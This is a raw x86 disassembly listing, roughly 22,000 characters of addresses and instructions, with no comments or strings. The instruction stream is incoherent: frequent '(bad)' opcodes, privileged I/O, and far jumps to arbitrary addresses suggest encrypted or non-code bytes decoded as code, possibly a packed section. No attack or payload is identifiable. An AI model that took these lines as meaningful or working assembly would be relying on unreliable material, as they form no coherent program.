  41b551:	aaa    
  41b552:	clc    
  41b553:	jp     0x41b57d
  41b555:	popfw  
  41b557:	push   es
  41b558:	pusha  
  41b559:	and    al,0x6a
  41b55b:	dec    ebp
  41b55c:	in     al,dx
  41b55d:	lea    esp,fs:[edx+ecx*4]
  41b561:	enter  0x259f,0x19
  41b565:	mov    ecx,0x8ebb0374
  41b56a:	dec    eax
  41b56b:	(bad)  
  41b56d:	arpl   WORD PTR [eax+0x53f63a93],dx
  41b573:	dec    edx
  41b574:	add    esi,esp
  41b576:	test   BYTE PTR [edi],ch
  41b578:	sti    
  41b579:	nop
  41b57a:	xlat   BYTE PTR ds:[ebx]
  41b57b:	xchg   esi,eax
  41b57c:	push   ss
  41b57d:	push   0x11
  41b57f:	adc    al,0xee
  41b581:	sbb    BYTE PTR gs:[ebx],dl
  41b584:	fstp   QWORD PTR [ebx+0x767d9e05]
  41b58b:	adc    DWORD PTR [edx],eax
  41b58d:	in     eax,dx
  41b58e:	sub    BYTE PTR [ebx+0x49],ah
  41b591:	rcl    DWORD PTR [eax+edi*8-0x7e],0x91
  41b596:	cwde   
  41b597:	je     0x41b578
  41b599:	add    ebx,eax
  41b59b:	adc    al,0xe5
  41b59d:	aam    0x32
  41b59f:	xor    DWORD PTR [edi+ecx*8],ebp
  41b5a2:	jno    0x41b567
  41b5a4:	and    bh,0x8f
  41b5a7:	mov    edx,0x92e9979c
  41b5ac:	les    edx,FWORD PTR [eax+0x38]
  41b5af:	xor    al,0x75
  41b5b1:	clc    
  41b5b2:	add    al,0x8a
  41b5b4:	fucomp st(4)
  41b5b6:	jo     0x41b592
  41b5b8:	clc    
  41b5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5ba:	mov    edx,DWORD PTR [eax-0x21]
  41b5bd:	cmc    
  41b5be:	hlt    
  41b5bf:	scas   eax,DWORD PTR es:[edi]
  41b5c0:	push   edx
  41b5c1:	xor    edx,edx
  41b5c3:	ins    DWORD PTR es:[edi],dx
  41b5c4:	mov    DWORD PTR [edx+0x2bc798d4],edi
  41b5ca:	xchg   ecx,eax
  41b5cb:	das    
  41b5cc:	jecxz  0x41b63c
  41b5ce:	jmp    0x41b617
  41b5d0:	mov    ah,0x2b
  41b5d2:	push   edi
  41b5d3:	lods   al,BYTE PTR ds:[esi]
  41b5d4:	cmp    ebx,DWORD PTR [edx+0x75ba4786]
  41b5da:	icebp  
  41b5db:	mov    bh,0x76
  41b5dd:	push   esp
  41b5de:	sbb    BYTE PTR [ebp+0x4316b4f7],ch
  41b5e4:	adc    ebp,esi
  41b5e6:	adc    edx,ecx
  41b5e8:	icebp  
  41b5e9:	dec    ebx
  41b5ea:	call   0x5f402a31
  41b5ef:	dec    eax
  41b5f0:	push   es
  41b5f1:	sbb    DWORD PTR [ebx-0x7bcdb77b],ecx
  41b5f7:	or     DWORD PTR [ecx],esp
  41b5f9:	mov    dh,0x32
  41b5fb:	cld    
  41b5fc:	je     0x41b65e
  41b5fe:	pop    eax
  41b5ff:	jmp    0x6ef7:0xeebb10c3
  41b606:	xchg   ebp,eax
  41b607:	xchg   edi,eax
  41b608:	cmp    al,0x4f
  41b60a:	dec    edi
  41b60b:	out    0x1d,eax
  41b60d:	(bad)  
  41b60e:	call   0xd29098f3
  41b613:	sub    al,0x2f
  41b615:	pop    ebx
  41b616:	js     0x41b60a
  41b618:	jp     0x41b60f
  41b61a:	fnstsw WORD PTR [esi]
  41b61c:	add    ebx,DWORD PTR [ecx-0x51ad329d]
  41b622:	mov    ds:0x6d4407b7,al
  41b627:	push   esi
  41b628:	and    eax,0x8f879a82
  41b62d:	xchg   edi,eax
  41b62e:	jmp    0x41b61b
  41b630:	inc    edi
  41b631:	test   BYTE PTR [edx],ah
  41b633:	or     al,0x0
  41b635:	js     0x41b5e8
  41b637:	sub    ecx,DWORD PTR [ebp+ecx*2-0x1dc4e8b9]
  41b63e:	or     eax,0x2fe7ae47
  41b643:	scas   eax,DWORD PTR es:[edi]
  41b644:	sub    BYTE PTR [ecx],ah
  41b646:	cmp    al,0xf7
  41b648:	int3   
  41b649:	scas   al,BYTE PTR es:[edi]
  41b64a:	shl    BYTE PTR [edx+0x77],cl
  41b64d:	mov    edi,0xea4d76ee
  41b652:	dec    eax
  41b653:	add    al,0xfa
  41b655:	pop    edx
  41b656:	cmp    al,BYTE PTR [ebx]
  41b658:	and    cl,dl
  41b65a:	popa   
  41b65b:	imul   ecx,DWORD PTR [eax+ebp*4+0x4b],0xe
  41b660:	inc    eax
  41b661:	(bad)  
  41b662:	sar    esp,1
  41b664:	adc    BYTE PTR [ecx-0x6a],ch
  41b667:	popf   
  41b668:	call   0x23cb:0x5a8f06c1
  41b66f:	xchg   ebx,eax
  41b670:	xchg   edx,eax
  41b671:	push   esp
  41b672:	aad    0x2
  41b674:	jne    0x41b5fc
  41b676:	aas    
  41b677:	sbb    BYTE PTR [edi-0x61dbbc59],0x54
  41b67e:	xor    al,0x9
  41b680:	push   es
  41b681:	mov    bl,BYTE PTR [esi]
  41b683:	or     esp,DWORD PTR [eax]
  41b685:	xchg   esi,edi
  41b687:	or     DWORD PTR [esi],eax
  41b689:	sahf   
  41b68a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b68b:	or     eax,0x560c6703
  41b690:	jmp    0x41b666
  41b692:	fist   DWORD PTR [edi+0x6f0e2b89]
  41b698:	cld    
  41b699:	sbb    eax,0x748c62fb
  41b69e:	(bad)  
  41b6a0:	das    
  41b6a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6a2:	jecxz  0x41b668
  41b6a4:	mov    bl,0xc1
  41b6a6:	pop    ebx
  41b6a7:	fbstp  TBYTE PTR [ecx]
  41b6a9:	cmc    
  41b6aa:	sub    ebx,ebx
  41b6ac:	out    dx,al
  41b6ad:	enter  0x8b39,0x9e
  41b6b1:	repnz out 0xfe,eax
  41b6b4:	pushf  
  41b6b5:	push   ds
  41b6b6:	data16 mov dh,BYTE PTR fs:[esi]
  41b6ba:	mov    esp,0xa76948ce
  41b6bf:	imul   ecx,DWORD PTR [edx-0x24e5ba57],0x24
  41b6c6:	or     ebp,esp
  41b6c8:	xchg   BYTE PTR [ecx+0x7e],dh
  41b6cb:	test   eax,0xc5fe1749
  41b6d0:	gs mov al,0xc6
  41b6d3:	adc    DWORD PTR [edx],ebx
  41b6d5:	rcl    DWORD PTR [eax],0xce
  41b6d8:	mov    DWORD PTR [esi+ebp*4-0x29],esi
  41b6dc:	ret    
  41b6dd:	xor    eax,ecx
  41b6df:	add    eax,esi
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0x6096970a]
  41b6f4:	sbb    al,0xf0
  41b6f6:	fsub   st,st(0)
  41b6f8:	jg     0x41b772
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b724
  41b6ff:	nop
  41b700:	adc    edx,ecx
  41b702:	in     eax,dx
  41b703:	lods   al,BYTE PTR ds:[esi]
  41b704:	pop    edx
  41b705:	push   edi
  41b706:	push   eax
  41b707:	mov    esi,DWORD PTR [ecx-0x6352c9bc]
  41b70d:	push   ecx
  41b70e:	test   al,0x89
  41b710:	in     eax,dx
  41b711:	jae    0x41b76e
  41b713:	dec    eax
  41b714:	cld    
  41b715:	or     eax,0x6f0bf7e
  41b71a:	int    0x98
  41b71c:	adc    DWORD PTR [eax+0x10],esi
  41b71f:	add    ecx,DWORD PTR [esi]
  41b721:	pop    ecx
  41b722:	popa   
  41b723:	inc    ebp
  41b724:	out    0x1a,eax
  41b726:	jg     0x41b76b
  41b728:	imul   eax,DWORD PTR [eax-0x72],0xff467a48
  41b72f:	in     al,dx
  41b730:	cmp    BYTE PTR [ebp+ecx*4+0x68cd5d99],bh
  41b737:	int    0x42
  41b739:	jl     0x41b6eb
  41b73b:	push   ss
  41b73c:	addr16 mov al,ds:0x596a
  41b740:	jge    0x41b74b
  41b742:	mov    ?,WORD PTR [edi]
  41b744:	aaa    
  41b745:	fsub   DWORD PTR [ebx-0x3482c64a]
  41b74b:	not    BYTE PTR [esi+edi*2]
  41b74e:	clc    
  41b74f:	lock mov esi,0xda1cda33
  41b755:	ins    BYTE PTR es:[edi],dx
  41b756:	cmp    BYTE PTR [edx-0x46d167a5],cl
  41b75c:	and    al,0xaf
  41b75e:	test   eax,0xb0dbc626
  41b763:	mov    esi,0xf82ebf24
  41b768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b769:	js     0x41b793
  41b76b:	dec    ebp
  41b76c:	lock enter 0x70a,0xa8
  41b771:	cmp    al,0x1c
  41b773:	pop    edx
  41b774:	in     al,dx
  41b775:	add    al,0x24
  41b777:	outs   dx,DWORD PTR ds:[esi]
  41b778:	ss sub al,0xc3
  41b77b:	xchg   BYTE PTR [esi],bh
  41b77d:	sti    
  41b77e:	mov    esi,0xb1031cc2
  41b783:	sahf   
  41b784:	and    dl,BYTE PTR [esi+edi*8+0xe1dc683]
  41b78b:	jne    0x41b79a
  41b78d:	mov    ah,0x26
  41b78f:	jnp    0x41b7dc
  41b791:	out    dx,al
  41b792:	or     al,0x18
  41b795:	in     al,dx
  41b796:	push   edi
  41b797:	dec    esp
  41b798:	mov    ds:0x2692e07d,eax
  41b79d:	mov    cl,0xc1
  41b79f:	popf   
  41b7a0:	ret    
  41b7a1:	std    
  41b7a2:	imul   eax,DWORD PTR [edi+edi*8+0x6c],0x47a5c345
  41b7aa:	sbb    eax,0x87a92ccc
  41b7af:	cmp    cl,BYTE PTR ds:0xbdcda5da
  41b7b5:	jecxz  0x41b812
  41b7b7:	stos   DWORD PTR es:[edi],eax
  41b7b8:	sbb    dh,BYTE PTR [edx+0x4a445085]
  41b7be:	lahf   
  41b7bf:	push   esp
  41b7c0:	std    
  41b7c1:	push   esi
  41b7c2:	xchg   BYTE PTR [ebp-0x1a],bh
  41b7c5:	add    eax,0x7481d052
  41b7ca:	shr    ebx,1
  41b7cc:	stos   BYTE PTR es:[edi],al
  41b7cd:	lgs    edi,FWORD PTR [edi-0x469f57a8]
  41b7d4:	adc    DWORD PTR [edx],esp
  41b7d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7d7:	xor    BYTE PTR [ebp+0x75b2ce65],dl
  41b7dd:	dec    ebx
  41b7de:	js     0x41b7b5
  41b7e0:	icebp  
  41b7e1:	jl     0x41b85d
  41b7e3:	xchg   DWORD PTR [esi-0x40a21193],edi
  41b7e9:	add    al,BYTE PTR [edi+edi*4]
  41b7ec:	inc    ebx
  41b7ed:	iret   
  41b7ee:	xor    eax,0xdc550f55
  41b7f3:	aam    0x5d
  41b7f5:	push   esp
  41b7f6:	(bad)  
  41b7f7:	aas    
  41b7f8:	popa   
  41b7f9:	pop    edx
  41b7fa:	test   DWORD PTR [edi+0x12],ecx
  41b7fd:	jb     0x41b867
  41b7ff:	cmp    al,0xf1
  41b801:	dec    esp
  41b802:	pop    edi
  41b803:	push   0x5e
  41b805:	add    eax,0x441df0b0
  41b80a:	das    
  41b80b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b80c:	fsub   st(5),st
  41b80e:	retf   0xb85f
  41b811:	clc    
  41b812:	jne    0x41b7d8
  41b814:	sbb    eax,0x4ee4db7b
  41b819:	cmc    
  41b81a:	lea    esi,[esi+0x6f7914a7]
  41b820:	imul   esp,DWORD PTR [ecx-0x7efecc28],0x33
  41b827:	nop
  41b828:	ja     0x41b86f
  41b82a:	cmp    ah,BYTE PTR [ebp+0x6f173a9e]
  41b830:	push   ebx
  41b831:	adc    dl,BYTE PTR [ecx]
  41b833:	sbb    eax,0x9d655479
  41b838:	inc    ebx
  41b839:	pop    ebp
  41b83a:	push   cs
  41b83b:	jmp    0xf462:0xa8cf237f
  41b842:	and    al,0xf7
  41b844:	js     0x41b800
  41b846:	lods   eax,DWORD PTR ds:[esi]
  41b847:	or     BYTE PTR [esi+esi*8+0x3feaa0d3],cl
  41b84e:	add    al,0x5f
  41b850:	aas    
  41b851:	fwait
  41b852:	sahf   
  41b853:	push   es
  41b854:	es into 
  41b856:	and    ah,al
  41b858:	xchg   ecx,eax
  41b859:	jae    0x41b8c4
  41b85b:	mov    ds:0xcd7e892a,eax
  41b860:	and    BYTE PTR [ebx],0x7f
  41b863:	and    BYTE PTR [edx-0xc],dh
  41b866:	mov    BYTE PTR ds:0x932c55df,al
  41b86c:	dec    ecx
  41b86d:	and    al,0x5d
  41b86f:	pop    edi
  41b870:	fbld   TBYTE PTR [ecx+0x6af526a0]
  41b876:	leave  
  41b877:	adc    al,0x21
  41b879:	enter  0xd6f2,0xf3
  41b87d:	mov    bl,dl
  41b87f:	sbb    eax,0x3d6d569
  41b884:	dec    ecx
  41b885:	xor    al,0x9d
  41b887:	cmp    BYTE PTR [ebp+0x7f8e7494],bh
  41b88d:	dec    ebp
  41b88e:	mov    ebx,0xed278936
  41b893:	jmp    0x41b817
  41b895:	inc    ecx
  41b896:	iret   
  41b897:	je     0x41b8aa
  41b899:	in     eax,dx
  41b89a:	xchg   esp,eax
  41b89b:	sahf   
  41b89c:	xchg   ebx,eax
  41b89d:	cmp    eax,0x37713e8e
  41b8a2:	sub    al,0xfb
  41b8a4:	mov    ah,0x95
  41b8a6:	inc    edx
  41b8a7:	jge    0x41b868
  41b8a9:	jle    0x41b86b
  41b8ab:	das    
  41b8ac:	rcr    DWORD PTR [ecx-0x21],1
  41b8af:	dec    edx
  41b8b0:	xor    bl,BYTE PTR [edx]
  41b8b2:	mov    edx,0xfc834052
  41b8b7:	ins    DWORD PTR es:[edi],dx
  41b8b8:	xchg   DWORD PTR [edi],ebx
  41b8ba:	mov    bl,0x92
  41b8bc:	and    eax,DWORD PTR [esi]
  41b8be:	fwait
  41b8bf:	sub    eax,ecx
  41b8c1:	aas    
  41b8c2:	fist   WORD PTR [edx]
  41b8c4:	ins    DWORD PTR es:[edi],dx
  41b8c5:	and    eax,0x6c656860
  41b8ca:	fld    st(7)
  41b8cc:	sub    BYTE PTR ds:0x2c15a591,ch
  41b8d2:	repnz mov ch,0xa4
  41b8d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8d6:	push   ss
  41b8d7:	cmp    ah,BYTE PTR [ebp+ebp*1+0x6]
  41b8db:	fiadd  WORD PTR [ebp-0x4f]
  41b8de:	(bad)  
  41b8df:	nop
  41b8e0:	and    eax,0x717adf01
  41b8e5:	mov    DWORD PTR [ebp+0x4e0852e4],esi
  41b8eb:	or     eax,0x9af65fcb
  41b8f0:	retf   
  41b8f1:	jne    0x41b8dc
  41b8f3:	xchg   ebp,eax
  41b8f4:	test   DWORD PTR [ebp-0x3a],ebp
  41b8f7:	fdivr  DWORD PTR [edi]
  41b8f9:	ret    
  41b8fa:	ds xchg ecx,eax
  41b8fc:	lahf   
  41b8fd:	sub    al,0x2
  41b8ff:	hlt    
  41b900:	and    al,0xaa
  41b902:	xchg   ah,bl
  41b904:	xchg   dl,ah
  41b906:	mov    dh,0x27
  41b908:	add    eax,0xc9722d7a
  41b90d:	inc    ebp
  41b90e:	jp     0x41b8f2
  41b910:	sub    ebp,eax
  41b912:	mov    eax,ds:0xfeaeb51
  41b917:	scas   eax,DWORD PTR es:[edi]
  41b918:	add    cl,BYTE PTR [ebx+0x30e9fc55]
  41b91e:	add    al,BYTE PTR [eax]
  41b920:	add    dh,al
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx+0x5e222136]
  41b92f:	fs jp  0x41b922
  41b932:	out    0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b8d4
  41b93a:	bnd jmp 0xa680383d
  41b940:	mov    cl,0xdc
  41b942:	mov    ebx,0xa2fe1c83
  41b947:	lahf   
  41b948:	xor    al,0x92
  41b94a:	clc    
  41b94b:	mov    bh,0x84
  41b94d:	push   ecx
  41b94e:	sar    bh,0xc7
  41b951:	test   ecx,0xf625e045
  41b957:	mov    eax,DWORD PTR [ebx-0x41a6128f]
  41b95d:	mov    edx,0x68778096
  41b962:	shl    DWORD PTR [eax-0x62935e02],1
  41b968:	adc    BYTE PTR [ebx],0x62
  41b96b:	and    BYTE PTR [ecx+0x26],bh
  41b96e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b96f:	jmp    0xec45:0xc3302f04
  41b976:	ins    DWORD PTR es:[edi],dx
  41b977:	and    esp,esi
  41b979:	scas   al,BYTE PTR es:[edi]
  41b97a:	dec    ecx
  41b97b:	xlat   BYTE PTR ds:[ebx]
  41b97c:	ss loopne 0x41b94e
  41b97f:	and    cl,dh
  41b981:	cli    
  41b982:	push   esp
  41b983:	and    eax,0x8bafc5c
  41b988:	gs push eax
  41b98a:	call   0xd489:0xdff7eeff
  41b991:	sbb    BYTE PTR [eax],al
  41b993:	cmp    DWORD PTR [esi+0x7a],esp
  41b996:	ins    BYTE PTR es:[edi],dx
  41b997:	inc    ebx
  41b998:	in     al,0xa5
  41b99a:	mov    ch,0x3f
  41b99c:	pop    es
  41b99d:	mov    al,ds:0xcd958ef5
  41b9a2:	cwde   
  41b9a3:	xor    al,cl
  41b9a5:	adc    edi,DWORD PTR [ecx-0x33]
  41b9a8:	enter  0x429a,0xa7
  41b9ac:	jo     0x41b982
  41b9ae:	sbb    dh,ch
  41b9b0:	push   eax
  41b9b1:	ficomp DWORD PTR [ebp-0x37]
  41b9b4:	fcom   DWORD PTR [edi+edx*1+0xf]
  41b9b8:	sub    BYTE PTR [ecx-0x65fabf76],ch
  41b9be:	dec    ebp
  41b9bf:	test   BYTE PTR [ebp+0x3ff11200],ah
  41b9c5:	cmp    al,0xdc
  41b9c7:	xor    DWORD PTR [edi+0x3e],0xffffffe4
  41b9cb:	into   
  41b9cc:	add    esi,DWORD PTR [eax+0x553c2d47]
  41b9d2:	fwait
  41b9d3:	inc    ebx
  41b9d4:	sub    ebp,DWORD PTR [eax]
  41b9d6:	mov    bl,BYTE PTR [edi-0xa]
  41b9d9:	jmp    0x41b9c0
  41b9db:	adc    ah,BYTE PTR [eax]
  41b9dd:	xor    edx,ebx
  41b9df:	outs   dx,BYTE PTR ds:[esi]
  41b9e0:	sbb    esi,DWORD PTR [edx+0x3e]
  41b9e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9e4:	jbe    0x41ba09
  41b9e6:	fcom   DWORD PTR [eax+0x58]
  41b9e9:	fwait
  41b9ea:	push   0xaa52bf76
  41b9ef:	jmp    0x71c6:0xccc3153f
  41b9f6:	mov    WORD PTR [ecx+0x213d23f5],cs
  41b9fc:	push   esi
  41b9fd:	jmp    0x1e17:0xe94bcb3c
  41ba04:	sbb    al,0x98
  41ba06:	mov    ch,0xad
  41ba08:	push   esi
  41ba09:	xchg   ch,al
  41ba0b:	jmp    0x41ba4d
  41ba0d:	je     0x41ba4c
  41ba0f:	mov    ss,ebp
  41ba11:	and    BYTE PTR [eax+0x3fd34643],dl
  41ba17:	fs enter 0xb97c,0xca
  41ba1c:	sbb    eax,DWORD PTR [ebp+0x72]
  41ba1f:	pop    es
  41ba20:	stos   DWORD PTR es:[edi],eax
  41ba21:	cwde   
  41ba22:	or     BYTE PTR [eax-0x3000476d],0x48
  41ba29:	call   0xab2f4165
  41ba2e:	mov    ds:0x41c86d15,eax
  41ba33:	out    0x3,al
  41ba35:	inc    ebp
  41ba36:	mov    dh,0xb3
  41ba38:	cmp    edi,DWORD PTR [eax-0x21]
  41ba3b:	xchg   esi,eax
  41ba3c:	jbe    0x41ba32
  41ba3e:	outs   dx,BYTE PTR ds:[esi]
  41ba3f:	jb     0x41ba4d
  41ba41:	pop    ebp
  41ba42:	add    al,0xd2
  41ba44:	pop    edx
  41ba45:	mov    edx,0x11ae497e
  41ba4a:	(bad)  
  41ba4c:	adc    ecx,DWORD PTR ds:0x211178a4
  41ba52:	xchg   edx,eax
  41ba53:	adc    dl,BYTE PTR [edx+0x558fbe88]
  41ba59:	fild   WORD PTR [ebx+edi*4]
  41ba5c:	(bad)  
  41ba5d:	data16 mov bl,0x49
  41ba60:	test   al,0x98
  41ba62:	gs or  al,0xa6
  41ba65:	ss or  cl,al
  41ba68:	pop    edi
  41ba69:	jb     0x41b9ec
  41ba6b:	adc    DWORD PTR [esi],ebx
  41ba6d:	mov    ebx,0x8906f8f2
  41ba72:	push   ds
  41ba73:	stc    
  41ba74:	jns    0x41ba93
  41ba76:	ins    DWORD PTR es:[edi],dx
  41ba77:	xor    edx,DWORD PTR [ebp-0x1a6793c0]
  41ba7d:	cdq    
  41ba7e:	mov    dh,0x50
  41ba80:	push   eax
  41ba81:	iret   
  41ba82:	(bad)  
  41ba83:	pop    ss
  41ba84:	je     0x41ba77
  41ba86:	and    dh,BYTE PTR [edx-0x4d]
  41ba89:	cmp    ah,BYTE PTR [edi+0x6b6c5741]
  41ba8f:	and    al,al
  41ba91:	pop    edi
  41ba92:	(bad)  
  41ba93:	pop    esi
  41ba94:	and    al,0xae
  41ba96:	bound  ebx,QWORD PTR [esi-0x25fc5502]
  41ba9c:	xchg   edx,eax
  41ba9d:	adc    bl,BYTE PTR [edi+0x3d75112a]
  41baa3:	push   cs
  41baa4:	test   eax,0xd26af058
  41baa9:	mov    ds:0x14235665,eax
  41baae:	mov    cl,ah
  41bab0:	rol    DWORD PTR [ebx],0x71
  41bab3:	xor    ch,ch
  41bab5:	cmc    
  41bab6:	sub    al,0xff
  41bab8:	push   es
  41bab9:	aas    
  41baba:	aam    0x70
  41babc:	mov    eax,0xa959ab36
  41bac1:	out    0x52,eax
  41bac3:	and    eax,0x2bb320d9
  41bac8:	rcl    DWORD PTR [edi-0x4e],0x1
  41bacc:	xlat   BYTE PTR ds:[ebx]
  41bacd:	fs (bad) 
  41bad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bad1:	ret    0xe31c
  41bad4:	jno    0x41bb07
  41bad6:	shl    DWORD PTR [esi-0x18],1
  41bad9:	retf   
  41bada:	adc    cl,BYTE PTR [ebp-0x1a5fb5ea]
  41bae0:	xor    BYTE PTR [ebx],0xf4
  41bae3:	(bad)  
  41bae4:	dec    BYTE PTR [ebx+0x30]
  41bae7:	jo     0x41bb5f
  41bae9:	add    DWORD PTR [esi-0x673337c5],edx
  41baef:	loopne 0x41ba7c
  41baf1:	mov    ebx,0x8e859e6b
  41baf6:	retf   0x6667
  41baf9:	nop
  41bafa:	dec    ebp
  41bafb:	jne    0x41bb68
  41bafd:	popf   
  41bafe:	push   esi
  41baff:	sub    al,0x54
  41bb01:	dec    ecx
  41bb02:	icebp  
  41bb03:	xchg   ebp,eax
  41bb04:	jle    0x41bada
  41bb06:	imul   edi,ecx,0xacdd9a44
  41bb0c:	dec    edx
  41bb0d:	daa    
  41bb0e:	xchg   ecx,eax
  41bb0f:	or     dl,BYTE PTR [ebp+0x6f210317]
  41bb15:	adc    eax,0x9008b31b
  41bb1a:	rcr    BYTE PTR [ebp+0x10],cl
  41bb1d:	inc    ecx
  41bb1e:	xor    al,0x58
  41bb20:	sub    dh,BYTE PTR [eax-0x50]
  41bb23:	sub    al,0xfe
  41bb25:	push   ecx
  41bb26:	sbb    ecx,edx
  41bb28:	inc    DWORD PTR [edi+0x12]
  41bb2b:	mov    bh,0x74
  41bb2d:	sbb    DWORD PTR [ebx+0x9],edx
  41bb30:	lock cmp ah,BYTE PTR [esi+0x6c]
  41bb34:	idiv   BYTE PTR [ebp-0x36]
  41bb37:	add    al,0x2c
  41bb39:	or     esp,ecx
  41bb3b:	bound  edx,QWORD PTR ss:[edi+eax*8+0x71]
  41bb40:	sbb    eax,0xfcbdfaa
  41bb45:	mov    edx,ecx
  41bb47:	inc    edx
  41bb48:	xor    cl,BYTE PTR [esi]
  41bb4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb4b:	jne    0x41bb1a
  41bb4d:	in     eax,0x3
  41bb4f:	repnz and DWORD PTR [ebx],esi
  41bb52:	shr    ecx,1
  41bb54:	xor    BYTE PTR [edx],al
  41bb56:	add    BYTE PTR [eax],al
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0x8617bf12
  41bb65:	std    
  41bb66:	sub    al,0x25
  41bb68:	mov    ah,ah
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bbb1
  41bb71:	xlat   BYTE PTR ds:[ebx]
  41bb72:	into   
  41bb73:	mov    dh,0x16
  41bb75:	push   edi
  41bb76:	stc    
  41bb77:	fisub  DWORD PTR [ebx+0x5b]
  41bb7a:	adc    eax,0xd5c07c58
  41bb7f:	call   0x38c2ea9e
  41bb84:	out    0xc9,al
  41bb86:	enter  0x9164,0x76
  41bb8a:	jo     0x41bb68
  41bb8c:	imul   esi,DWORD PTR [edx],0x50
  41bb8f:	loop   0x41bbec
  41bb91:	jb     0x41bb18
  41bb93:	push   ds
  41bb94:	fstp   TBYTE PTR [edx-0x3e]
  41bb97:	xchg   edi,eax
  41bb98:	hlt    
  41bb99:	jmp    0xd349ab72
  41bb9e:	mov    ds:0xb12a9c41,eax
  41bba3:	mov    ch,0xab
  41bba5:	loope  0x41bb90
  41bba7:	dec    esi
  41bba8:	or     BYTE PTR [eax],ch
  41bbaa:	test   DWORD PTR [ebx+0x3f],edx
  41bbad:	adc    cl,BYTE PTR [esi-0x32e2502f]
  41bbb3:	mov    eax,ds:0x9033e58a
  41bbb8:	fsubr  QWORD PTR [ecx]
  41bbba:	loopne 0x41bbf2
  41bbbc:	(bad)  
  41bbbe:	sub    DWORD PTR [edx],esi
  41bbc0:	lock into 
  41bbc2:	ja     0x41bb7d
  41bbc4:	pop    ebx
  41bbc5:	test   al,0xb6
  41bbc7:	dec    edx
  41bbc8:	mov    esp,0x4d2cf929
  41bbcd:	push   es
  41bbce:	and    al,0xa2
  41bbd0:	fwait
  41bbd1:	(bad)  
  41bbd2:	shl    ch,1
  41bbd4:	ror    BYTE PTR [ecx-0x376cc678],1
  41bbda:	popa   
  41bbdb:	mov    edi,ebx
  41bbdd:	gs test eax,0x23d55967
  41bbe3:	mov    al,0x1b
  41bbe5:	std    
  41bbe6:	jg     0x41bba5
  41bbe8:	mov    ds:0xd8815b50,eax
  41bbed:	or     DWORD PTR [edx+0x733672a1],ebp
  41bbf3:	je     0x41bc52
  41bbf5:	xchg   ebp,eax
  41bbf6:	cwde   
  41bbf7:	jno    0x41bc17
  41bbf9:	xor    al,0x32
  41bbfb:	test   eax,0x993743df
  41bc00:	mov    edi,0x9968ced0
  41bc05:	cmp    ebx,DWORD PTR [edx-0x5]
  41bc08:	cmp    ch,bl
  41bc0a:	icebp  
  41bc0b:	push   eax
  41bc0c:	mov    ecx,0x1010b138
  41bc11:	xor    al,0x6d
  41bc13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc14:	and    BYTE PTR [ebp-0x533adfcf],dh
  41bc1a:	imul   edi,esp,0x13
  41bc1d:	adc    ch,cl
  41bc1f:	repnz adc WORD PTR [eax+eax*2],cx
  41bc24:	mov    al,ds:0x92e2ad07
  41bc29:	imul   ecx,DWORD PTR [ebx-0x25367a0f],0xffffffb7
  41bc30:	gs push edx
  41bc32:	pop    edi
  41bc33:	popf   
  41bc34:	fcom   DWORD PTR [edi]
  41bc36:	and    ebp,DWORD PTR [edi]
  41bc38:	rcr    ecx,1
  41bc3a:	add    BYTE PTR [esi],dh
  41bc3c:	in     al,dx
  41bc3d:	and    DWORD PTR [ebp-0x57],ecx
  41bc40:	test   ebp,ebp
  41bc42:	outs   dx,DWORD PTR ds:[esi]
  41bc43:	push   edi
  41bc44:	push   esp
  41bc45:	arpl   WORD PTR [ebp-0xf],dx
  41bc48:	stos   DWORD PTR es:[edi],eax
  41bc49:	push   eax
  41bc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc4b:	in     al,0xbe
  41bc4d:	mov    ah,0xc2
  41bc4f:	dec    esp
  41bc50:	scas   al,BYTE PTR es:[edi]
  41bc51:	outs   dx,BYTE PTR ds:[esi]
  41bc52:	mov    ah,0x85
  41bc54:	pop    edx
  41bc55:	cmp    cl,BYTE PTR [ecx+0xb04c95d]
  41bc5b:	popf   
  41bc5c:	add    esi,DWORD PTR [esi+0x57]
  41bc5f:	add    dh,al
  41bc61:	fwait
  41bc62:	idiv   DWORD PTR [eax-0xfe10ce2]
  41bc68:	scas   al,BYTE PTR es:[edi]
  41bc69:	xchg   edx,eax
  41bc6a:	(bad)  
  41bc6c:	xchg   DWORD PTR [edi],edx
  41bc6e:	bound  eax,QWORD PTR [edi+0x43cde120]
  41bc74:	icebp  
  41bc75:	into   
  41bc76:	push   0xffffff80
  41bc78:	add    eax,0x85d52792
  41bc7d:	sbb    BYTE PTR [eax],ah
  41bc7f:	test   al,0xfa
  41bc81:	loope  0x41bc47
  41bc83:	add    al,0xbf
  41bc85:	jo     0x41bcd1
  41bc87:	push   0xffffffc2
  41bc89:	and    al,0xe2
  41bc8b:	mov    eax,0x13e1adc4
  41bc90:	dec    ebp
  41bc92:	mov    WORD PTR [edi+0x1bdba061],ds
  41bc98:	sbb    ecx,edi
  41bc9a:	fs dec edx
  41bc9c:	mov    edx,0x6ef148b1
  41bca1:	xchg   esi,eax
  41bca2:	repz and ebp,edi
  41bca5:	adc    eax,0x102ce689
